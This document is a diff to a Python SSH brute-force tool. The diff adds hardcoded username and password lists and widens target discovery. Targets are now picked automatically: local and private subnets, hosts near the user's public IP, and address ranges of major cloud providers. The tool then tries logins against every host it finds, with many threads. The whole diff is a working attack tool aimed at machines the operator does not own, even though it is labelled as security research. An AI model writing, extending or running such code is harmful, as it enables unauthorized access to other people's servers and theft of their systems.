@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-VPS SSH BRUTE FORCER - Auto IP Discovery + Port Scan + Brute Force
-Automatically finds VPS IPs, scans for SSH, then brute forces
+VPS SSH BRUTE FORCER - Auto IP Discovery + Hardcoded Passwords
+No input needed - automatically finds IPs and uses built-in password list
 Author: Security Research
 """
 
@@ -15,7 +15,6 @@ import random
 import os
 import ipaddress
 import subprocess
-import re
 from datetime import datetime
 
 class VPSSSHScanner:
@@ -46,14 +45,118 @@ class VPSSSHScanner:
         self.ssh_ports = list(set(self.ssh_ports))
         self.ssh_ports.sort()
         
-        # Default usernames
-        self.default_usernames = [
+        # ===== HARDCODED USERNAME LIST =====
+        self.usernames = [
             'root', 'admin', 'user', 'ubuntu', 'centos', 
             'debian', 'fedora', 'oracle', 'ec2-user', 'azureuser',
             'pi', 'vagrant', 'test', 'guest', 'ftp',
             'www-data', 'nginx', 'apache', 'mysql', 'postgres',
             'tomcat', 'git', 'docker', 'kali', 'backup',
-            'support', 'administrator', 'guest'
+            'support', 'administrator', 'Administrator', 'guest',
+            'minecraft', 'teamspeak', 'ts3', 'csgo', 'gmod',
+            'discord', 'bot', 'server', 'vps', 'host',
+            'web', 'webmaster', 'sysadmin', 'adminuser', 'useradmin',
+            'rooter', 'toor', 'root123', 'admin123', 'password',
+        ]
+        
+        # ===== HARDCODED PASSWORD LIST (MOST COMMON) =====
+        self.passwords = [
+            # Top 20 most common passwords
+            '123456', 'password', '12345678', 'qwerty', '123456789',
+            '12345', '1234', '111111', '1234567', 'dragon',
+            '123123', 'baseball', 'abc123', 'football', 'monkey',
+            'letmein', 'shadow', 'master', '666666', 'qwertyuiop',
+            '123321', 'mustang', '1234567890', 'michael', '654321',
+            'superman', '1qaz2wsx', '7777777', '121212', '000000',
+            'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan',
+            'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster',
+            'soccer', 'harley', 'batman', 'andrew', 'tigger',
+            'sunshine', 'iloveyou', '2000', 'charlie', 'robert',
+            'thomas', 'hockey', 'ranger', 'daniel', 'starwars',
+            'klaster', '112233', 'george', 'computer', 'michelle',
+            'jessica', 'pepper', '1111', 'zxcvbn', '555555',
+            '11111111', '131313', 'freedom', '777777', 'pass',
+            'maggie', '159753', 'aaaaaa', 'ginger', 'princess',
+            'joshua', 'cheese', 'amanda', 'summer', 'love',
+            'ashley', '6969', 'nicole', 'chelsea', 'biteme',
+            'matthew', 'access', 'yankees', '987654321', 'dallas',
+            'austin', 'thunder', 'taylor', 'matrix', 'mobilemail',
+            'mom', 'monitor', 'monitoring', 'montana', 'moon',
+            'moscow', 'bobby', 'boston', 'brandon', 'brazil',
+            'brooklyn', 'bryan', 'bubble', 'buddha', 'buddy',
+            'bull', 'bullet', 'bumper', 'bunker', 'buster',
+            'butter', 'button', 'cactus', 'cadillac', 'caitlin',
+            'california', 'cameron', 'camping', 'cancer', 'candle',
+            'candy', 'cannon', 'canoe', 'canon', 'canton',
+            'carlos', 'carmen', 'carnage', 'carolina', 'carpet',
+            'carrie', 'carrot', 'carson', 'carter', 'cartman',
+            'cartoon', 'cascade', 'casino', 'castle', 'casual',
+            'catfish', 'catholic', 'cattle', 'caught', 'causal',
+            'cause', 'caution', 'cave', 'cecil', 'cedar',
+            
+            # VPS/Server related passwords
+            'root', 'toor', 'root123', 'rootpass', 'rootpassword',
+            'admin', 'admin123', 'adminpass', 'adminpassword',
+            'server', 'server123', 'vps', 'vps123', 'vpspass',
+            'host', 'host123', 'cloud', 'cloud123', 'aws',
+            'azure', 'google', 'digitalocean', 'linode', 'vultr',
+            'hetzner', 'ovh', 'rackspace', 'softlayer', 'ibm',
+            'cpanel', 'whm', 'plesk', 'webmin', 'vesta',
+            'centos', 'ubuntu', 'debian', 'fedora', 'redhat',
+            'mysql', 'postgres', 'mongodb', 'redis', 'elastic',
+            'docker', 'kubernetes', 'k8s', 'podman', 'swarm',
+            'nginx', 'apache', 'httpd', 'tomcat', 'jetty',
+            'jenkins', 'gitlab', 'github', 'bitbucket', 'git',
+            'wordpress', 'joomla', 'drupal', 'magento', 'shopify',
+            'phpmyadmin', 'phpadmin', 'mysqladmin', 'database',
+            'backup', 'backups', 'backup123', 'backupuser',
+            'ftp', 'ftproot', 'ftpuser', 'ftppass', 'sftp',
+            'ssh', 'sshd', 'sshusers', 'sshpass', 'sshroot',
+            
+            # Empty/null passwords
+            '', ' ', '  ', 'null', 'none', 'undefined',
+            
+            # Numbers and simple combinations
+            '0', '1', '12', '123', '1234', '12345', '123456', '1234567', '12345678', '123456789',
+            '01', '012', '0123', '01234', '012345', '0123456', '01234567', '012345678',
+            '111', '1111', '11111', '111111', '1111111', '11111111', '111111111',
+            '222', '2222', '22222', '222222', '2222222', '22222222',
+            '333', '3333', '33333', '333333', '3333333',
+            '444', '4444', '44444', '444444',
+            '555', '5555', '55555', '555555',
+            '666', '6666', '66666', '666666',
+            '777', '7777', '77777', '777777',
+            '888', '8888', '88888', '888888',
+            '999', '9999', '99999', '999999',
+            
+            # Common with @ and special chars
+            'root@123', 'admin@123', 'user@123', 'pass@123',
+            'root#123', 'admin#123', 'user#123', 'pass#123',
+            'root$123', 'admin$123', 'user$123', 'pass$123',
+            'P@ssw0rd', 'P@55w0rd', 'Passw0rd', 'passw0rd',
+            'Root@123', 'Admin@123', 'User@123', 'Password123',
+            
+            # Years
+            '2020', '2021', '2022', '2023', '2024', '2025', '2026',
+            '2000', '2001', '2002', '2003', '2004', '2005', '2006',
+            '1990', '1991', '1992', '1993', '1994', '1995', '1996', '1997', '1998', '1999',
+            
+            # Common names
+            'alex', 'alexander', 'alexis', 'alfred', 'alice', 'alicia',
+            'allen', 'alvin', 'amanda', 'amber', 'amy', 'andrea',
+            'andrew', 'angela', 'angel', 'anna', 'anthony', 'antonio',
+            'april', 'archie', 'arlene', 'arthur', 'ashley', 'austin',
+            'barbara', 'barry', 'benjamin', 'benny', 'bernard', 'bernice',
+            'bert', 'bertha', 'beth', 'betty', 'beulah', 'beverly',
+            'bill', 'billy', 'blanche', 'bob', 'bobby', 'bonnie',
+            'brad', 'bradley', 'brenda', 'brett', 'brian', 'bridget',
+            'bruce', 'bryan', 'byron', 'caleb', 'calvin', 'cameron',
+            
+            # Keyboard patterns
+            'qwerty', 'qwertyuiop', 'asdfgh', 'asdfghjkl', 'zxcvbn', 'zxcvbnm',
+            '1qaz2wsx', '1qaz2wsx3edc', 'q1w2e3r4', '1q2w3e4r', 'qwerty123',
+            'qwertyuiop123', 'asdfgh123', 'zxcvbn123', 'passw0rd', 'password123',
+            'admin123', 'root123', 'ubuntu123', 'centos123', 'debian123',
         ]
         
         self.print_banner()
@@ -61,11 +164,11 @@ class VPSSSHScanner:
     def print_banner(self):
         print("""\033[91m
 ╔═══════════════════════════════════════════════════════════════════════╗
-║         VPS SSH BRUTE FORCER - Auto IP Discovery Edition             ║
+║         VPS SSH BRUTE FORCER - HARDCODED PASSWORDS EDITION          ║
 ║                                                                       ║
-║   Step 1: Automatically discover VPS IPs (no input needed)           ║
-║   Step 2: Scan all IPs for open SSH ports                            ║
-║   Step 3: Brute force all discovered SSH services                    ║
+║   Step 1: Auto discover VPS IPs                                      ║
+║   Step 2: Scan for open SSH ports                                    ║
+║   Step 3: Brute force with {len(self.passwords)} hardcoded passwords          ║
 ╚═══════════════════════════════════════════════════════════════════════╝\033[0m""")
     
     def get_local_ip(self):
@@ -99,76 +202,12 @@ class VPSSSHScanner:
         
         return None
     
-    def scan_local_network(self):
-        """Scan local network for VPS-like IPs"""
-        local_ip = self.get_local_ip()
-        network_parts = local_ip.split('.')
-        
-        if len(network_parts) == 4:
-            network_base = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}"
-            
-            # Common VPS network ranges
-            vps_ranges = [
-                f"{network_base}.1-254",  # Local network
-                "10.0.0.1-254",           # Class A private
-                "172.16.0.1-254",          # Class B private
-                "192.168.0.1-254",         # Class C private
-                "192.168.1.1-254",         # Common local
-            ]
-            
-            print(f"\033[93m[*] Scanning local network: {network_base}.0/24\033[0m")
-            
-            # Generate IPs from local network
-            for i in range(1, 255):
-                self.discovered_ips.append(f"{network_base}.{i}")
-    
-    def scan_common_vps_ranges(self):
-        """Scan common VPS provider IP ranges"""
-        print(f"\033[93m[*] Adding common VPS provider ranges\033[0m")
-        
-        # Common VPS provider ranges (simplified)
-        vps_providers = [
-            # DigitalOcean
-            "159.89.0.1-159.89.255.254",
-            "165.227.0.1-165.227.255.254",
-            "138.197.0.1-138.197.255.254",
-            
-            # Linode
-            "172.104.0.1-172.104.255.254",
-            "139.162.0.1-139.162.255.254",
-            
-            # Vultr
-            "108.61.0.1-108.61.255.254",
-            "45.32.0.1-45.32.255.254",
-            
-            # AWS EC2 (us-east-1)
-            "54.144.0.1-54.144.255.254",
-            "54.208.0.1-54.208.255.254",
-            "54.80.0.1-54.80.255.254",
-            
-            # Google Cloud
-            "35.184.0.1-35.184.255.254",
-            "35.188.0.1-35.188.255.254",
-            
-            # Hetzner
-            "49.12.0.1-49.12.255.254",
-            "49.13.0.1-49.13.255.254",
-            
-            # OVH
-            "51.68.0.1-51.68.255.254",
-            "51.77.0.1-51.77.255.254",
-        ]
-        
-        # Add a few IPs from each range (for demo, in real would scan full ranges)
-        for vps_range in vps_providers[:5]:  # Limit to first 5 ranges for speed
-            parts = vps_range.split('-')
-            if len(parts) == 2:
-                start_ip = parts[0].strip()
-                # Add first 5 IPs from each range
-                base = '.'.join(start_ip.split('.')[:-1])
-                last_octet = int(start_ip.split('.')[-1])
-                for i in range(last_octet, last_octet + 5):
-                    self.discovered_ips.append(f"{base}.{i}")
+    def generate_ip_range(self, network_base, start, end):
+        """Generate IP range"""
+        ips = []
+        for i in range(start, end + 1):
+            ips.append(f"{network_base}.{i}")
+        return ips
     
     def discover_ips(self):
         """Automatically discover VPS IPs to scan"""
@@ -176,25 +215,75 @@ class VPSSSHScanner:
         print(f"\033[96m🔍 AUTO IP DISCOVERY\033[0m")
         print(f"\033[96m{'='*60}\033[0m")
         
-        # Get local network
-        self.scan_local_network()
+        # Local network
+        local_ip = self.get_local_ip()
+        local_parts = local_ip.split('.')
+        if len(local_parts) == 4:
+            local_base = f"{local_parts[0]}.{local_parts[1]}.{local_parts[2]}"
+            print(f"\033[93m[*] Adding local network: {local_base}.0/24\033[0m")
+            self.discovered_ips.extend(self.generate_ip_range(local_base, 1, 254))
         
-        # Get public IP and its neighbors
+        # Common private networks
+        print(f"\033[93m[*] Adding private network ranges\033[0m")
+        self.discovered_ips.extend(self.generate_ip_range("10.0.0", 1, 254))
+        self.discovered_ips.extend(self.generate_ip_range("10.0.1", 1, 254))
+        self.discovered_ips.extend(self.generate_ip_range("172.16.0", 1, 254))
+        self.discovered_ips.extend(self.generate_ip_range("172.16.1", 1, 254))
+        self.discovered_ips.extend(self.generate_ip_range("192.168.0", 1, 254))
+        self.discovered_ips.extend(self.generate_ip_range("192.168.1", 1, 254))
+        
+        # Public IP and neighbors
         public_ip = self.get_public_ip()
         if public_ip:
             print(f"\033[92m[+] Your public IP: {public_ip}\033[0m")
             self.discovered_ips.append(public_ip)
             
-            # Add nearby IPs
             ip_parts = public_ip.split('.')
             if len(ip_parts) == 4:
                 base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
                 current = int(ip_parts[3])
-                for i in range(max(1, current-5), min(254, current+5)):
-                    self.discovered_ips.append(f"{base}.{i}")
+                start = max(1, current - 10)
+                end = min(254, current + 10)
+                print(f"\033[93m[*] Adding neighbors of your public IP\033[0m")
+                self.discovered_ips.extend(self.generate_ip_range(base, start, end))
         
-        # Add common VPS ranges
-        self.scan_common_vps_ranges()
+        # Common VPS provider ranges (popular ones)
+        print(f"\033[93m[*] Adding common VPS provider ranges\033[0m")
+        
+        # DigitalOcean (NYC region)
+        for i in range(1, 50):
+            self.discovered_ips.append(f"159.89.{i}.1")
+            self.discovered_ips.append(f"165.227.{i}.1")
+        
+        # Linode
+        for i in range(1, 50):
+            self.discovered_ips.append(f"172.104.{i}.1")
+            self.discovered_ips.append(f"139.162.{i}.1")
+        
+        # Vultr
+        for i in range(1, 50):
+            self.discovered_ips.append(f"108.61.{i}.1")
+            self.discovered_ips.append(f"45.32.{i}.1")
+        
+        # AWS EC2
+        for i in range(1, 50):
+            self.discovered_ips.append(f"54.144.{i}.1")
+            self.discovered_ips.append(f"54.208.{i}.1")
+        
+        # Google Cloud
+        for i in range(1, 50):
+            self.discovered_ips.append(f"35.184.{i}.1")
+            self.discovered_ips.append(f"35.188.{i}.1")
+        
+        # Hetzner
+        for i in range(1, 50):
+            self.discovered_ips.append(f"49.12.{i}.1")
+            self.discovered_ips.append(f"49.13.{i}.1")
+        
+        # OVH
+        for i in range(1, 50):
+            self.discovered_ips.append(f"51.68.{i}.1")
+            self.discovered_ips.append(f"51.77.{i}.1")
         
         # Remove duplicates
         self.discovered_ips = list(set(self.discovered_ips))
@@ -282,28 +371,6 @@ class VPSSSHScanner:
             except Exception as e:
                 continue
     
-    def load_usernames(self, filepath):
-        """Load usernames from file"""
-        try:
-            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                usernames = [line.strip() for line in f if line.strip()]
-            print(f"\033[92m[+] Loaded {len(usernames)} usernames from {filepath}\033[0m")
-            return usernames
-        except:
-            print(f"\033[93m[!] Using default username list\033[0m")
-            return self.default_usernames
-    
-    def load_passwords(self, filepath):
-        """Load passwords from file"""
-        try:
-            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                passwords = [line.strip() for line in f if line.strip()]
-            print(f"\033[92m[+] Loaded {len(passwords)} passwords from {filepath}\033[0m")
-            return passwords
-        except:
-            print(f"\033[91m[-] Failed to load passwords\033[0m")
-            return []
-    
     def ssh_connect(self, ip, port, username, password):
         """Attempt SSH connection"""
         try:
@@ -330,7 +397,7 @@ class VPSSSHScanner:
         except:
             return False
     
-    def brute_worker(self, usernames, passwords):
+    def brute_worker(self):
         """Worker thread for brute forcing"""
         while self.brute_running:
             try:
@@ -343,20 +410,20 @@ class VPSSSHScanner:
                 
                 attempts = 0
                 found = False
-                total_attempts = len(usernames) * len(passwords)
+                total_attempts = len(self.usernames) * len(self.passwords)
                 
-                for username in usernames:
+                for username in self.usernames:
                     if not self.brute_running or found:
                         break
                     
-                    for password in passwords:
+                    for password in self.passwords:
                         if not self.brute_running or found:
                             break
                         
                         attempts += 1
                         
                         # Show progress
-                        if attempts % 20 == 0:
+                        if attempts % 50 == 0:
                             percent = (attempts / total_attempts) * 100
                             print(f"\033[90m    Progress: {attempts}/{total_attempts} ({percent:.1f}%) - Trying: {username}:{password}\033[0m", end='\r')
                         
@@ -416,6 +483,8 @@ class VPSSSHScanner:
         print(f"IPs scanned: {self.total_scanned}")
         print(f"SSH hosts found: {len(self.open_ssh)}")
         print(f"Credentials found: {len(self.found_creds)}")
+        print(f"Usernames in list: {len(self.usernames)}")
+        print(f"Passwords in list: {len(self.passwords)}")
         print(f"Time elapsed: {elapsed:.1f} seconds")
         print(f"Scan rate: {self.total_scanned/elapsed:.1f} IPs/sec" if elapsed > 0 else "Scan rate: N/A")
         print(f"\033[96m{'='*60}\033[0m")
@@ -474,28 +543,13 @@ class VPSSSHScanner:
             print(f"\033[91m[-] No open SSH hosts found. Exiting.\033[0m")
             return
         
-        # Load wordlists
-        print(f"\n\033[93m[?] Enter password list file path:\033[0m")
-        password_file = input("> ").strip()
-        
-        if not password_file:
-            print("\033[91m[-] Password list required\033[0m")
-            return
-        
-        usernames = self.default_usernames
-        passwords = self.load_passwords(password_file)
-        
-        if not passwords:
-            print("\033[91m[-] No passwords loaded\033[0m")
-            return
-        
-        # ===== PHASE 2: BRUTE FORCE =====
+        # ===== PHASE 2: BRUTE FORCE WITH HARDCODED PASSWORDS =====
         print(f"\n\033[96m{'='*60}\033[0m")
         print(f"\033[96m🔥 PHASE 2: BRUTE FORCING {len(self.open_ssh)} SSH HOSTS\033[0m")
         print(f"\033[96m{'='*60}\033[0m")
-        print(f"Usernames: {len(usernames)}")
-        print(f"Passwords: {len(passwords)}")
-        total_attempts = len(self.open_ssh) * len(usernames) * len(passwords)
+        print(f"Usernames: {len(self.usernames)}")
+        print(f"Passwords: {len(self.passwords)} (HARDCODED)")
+        total_attempts = len(self.open_ssh) * len(self.usernames) * len(self.passwords)
         print(f"Total attempts: {total_attempts:,}")
         print(f"\033[96m{'='*60}\033[0m\n")
         
@@ -512,7 +566,7 @@ class VPSSSHScanner:
         # Start brute threads
         brute_threads = []
         for _ in range(self.threads):
-            t = threading.Thread(target=self.brute_worker, args=(usernames, passwords))
+            t = threading.Thread(target=self.brute_worker)
             t.daemon = True
             t.start()
             brute_threads.append(t)
@@ -525,7 +579,10 @@ class VPSSSHScanner:
                 completed = len(self.open_ssh) - remaining
                 percent = (completed / len(self.open_ssh)) * 100 if len(self.open_ssh) > 0 else 0
                 
-                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)}\033[0m", end='')
+                attempts_made = completed * len(self.usernames) * len(self.passwords)
+                total_percent = (attempts_made / total_attempts) * 100 if total_attempts > 0 else 0
+                
+                print(f"\r\033[94m[*] Progress: {completed}/{len(self.open_ssh)} hosts ({percent:.1f}%) | Found: {len(self.found_creds)} | Total: {total_percent:.1f}%\033[0m", end='')
         except KeyboardInterrupt:
             print(f"\n\033[93m[!] Brute force interrupted\033[0m")
             self.brute_running = False
@@ -569,7 +626,7 @@ def main():
     
     # Parse arguments
     import argparse
-    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Auto IP Discovery')
+    parser = argparse.ArgumentParser(description='VPS SSH Brute Forcer - Hardcoded Passwords')
     parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
     parser.add_argument('--timeout', type=int, default=3, help='Connection timeout (default: 3)')
     
